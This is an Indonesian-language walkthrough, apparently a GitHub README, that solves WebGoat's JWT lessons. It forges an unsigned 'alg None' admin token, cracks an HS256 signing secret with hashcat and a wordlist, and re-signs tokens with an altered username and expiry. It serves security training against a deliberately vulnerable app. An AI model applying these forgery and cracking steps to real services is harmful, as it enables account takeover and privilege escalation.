# JWT tokens
JSON Web Token digunakan untuk membawa informasi terkait identitas dan karakteristik (klaim) klien yang ditandatangani oleh server untuk menghindari kerusakan karena diubah oleh klien, misalnya identitas atau ciri-ciri (contoh: mengubah peran dari yang pengguna biasa menjadi admin atau mengubah login klien).

## Decoding a JWT token
- **Pertanyaan:**
```sh
eyJhbGciOiJIUzI1NiJ9.ew0KICAiYXV0aG9yaXRpZXMiIDogWyAiUk9MRV9BRE1JTiIsICJST0xFX1VTRVIiIF0sDQogICJjbGllbnRfaWQiIDogIm15LWNsaWVudC13aXRoLXNlY3JldCIsDQogICJleHAiIDogMTYwNzA5OTYwOCwNCiAgImp0aSIgOiAiOWJjOTJhNDQtMGIxYS00YzVlLWJlNzAtZGE1MjA3NWI5YTg0IiwNCiAgInNjb3BlIiA6IFsgInJlYWQiLCAid3JpdGUiIF0sDQogICJ1c2VyX25hbWUiIDogInVzZXIiDQp9.9lYaULTuoIDJ86-zKDSntJQyHPpJ2mZAbnWRfel99iI
```
- Decode secara online di https://jwt.io/

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%201.JPG)

- **Jawaban:**
```sh
username: user
```

## JWT signing
- Jalankan tool Burpsuite
- Ubah user ke **Tom**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%202.JPG)

- Tekan tombol **Reset votes**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%204.JPG)

- Buka Burp Suite, cari request yang mengarah ke **/WebGoat/JWT/votings**. Klik kanan request tersebut lalu pilih **Send to Repeater**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%205.JPG)

- Pindah ke tab Repeater lalu klik tombol **Send**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%206.JPG)

- Copy JWT Token pada filed Request

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%207.JPG)

- Pindah ke tab Decoder lalu paste JWT Token tadi

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%208.JPG)

- Blok header JWT Token lalu pilih Decode as ... > Base64

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%209.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2010.JPG)

- Blok claims JWT Token lalu pilih Decode as ... > Base64

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2011.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2012.JPG)

- Tambahkan tanda `=` sebelah angka 0 pada bagian akhir claims JWT Tokens sehingga diperoleh hasil encode sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2013.JPG)

- Buka tool Cyber Chef https://gchq.github.io/CyberChef/ tarik menu **To Base64** ke field Recipe

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2014.jpg)

- Ubah header JWT Token menjadi seperti berikut lalu encode ke base64 menggunakan tool Cyber Chef
```sh
{"alg":"None"}
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2015.JPG)

- Ubah claims JWT Token menjadi seperti berikut lalu encode ke base64 menggunakan tool Cyber Chef
```sh
{"iat":1698726054,"admin":"true","user":"Tom"}
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2016.JPG)

- Sekarang kita tinggal menyatukan hasil encode base64 menjadi JWT Token yang utuh dengan format `header.claims.`. Hilangkan tanda `=` pada hasil encode sehingga terbentuk JWT Token yang baru sebagai berikut
```sh
eyJhbGciOiJOb25lIn0.eyJpYXQiOjE2OTg3MjYwNTQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
```
- Buka kembali tab Repeater Burpsuite, lalu ubah cookie **access_token** dengan JWT Token diatas

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2017.JPG)

- Jika sudah tekan tombol **Send**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2018.JPG)

## Code review

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2019.JPG)

## JWT cracking
- JWT Token
```sh
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY5Nzg3ODk2MywiZXhwIjoxNjk3ODc5MDIzLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.5L8I4luDQqgNycee6cenWi8D9kYX3BrmfIZyW2RzaXw
```
- Kali ini kita menggunakan tool `hashcat` untuk meng-crack JWT
- Berdasarkan website https://hashcat.net/wiki/doku.php?id=example_hashes mode untuk crack JWT adalah **16500**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2020.JPG)

- Untuk wordlists kita akan gunakan `Seclists` https://github.com/danielmiessler/SecLists untuk kali linux cukup gunakan perintah berikut melakukan instalasi
```sh
sudo apt install seclists
```
- Simpan token ke sebuah file dengan perintah berikut ini
```sh
echo 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY5Nzg3ODk2MywiZXhwIjoxNjk3ODc5MDIzLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.5L8I4luDQqgNycee6cenWi8D9kYX3BrmfIZyW2RzaXw' > jwt_token.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2021.JPG)

- Lakukan cracking menggunakan tool hascat
```sh
hashcat -m 16500 jwt_token.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2022.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2023.JPG)

- Buka website https://jwt.io/ lalu masukkan JWT Token diatas

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2024.JPG)

- Kemudian masukkan secret key yang diperoleh dari tool hashcat ke field VERIFY SIGNATURE

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2025.JPG)

- Ubah username menjadi **WebGoat**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2026.JPG)

- Naikan nilai exp untuk memperpanjang masa aktif JWT Token

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2027.JPG)

- Copy JWT Token hasil encode untuk menjawab soal

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2028.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/JWT%20Tokens/jwt%20tokens%2029.JPG)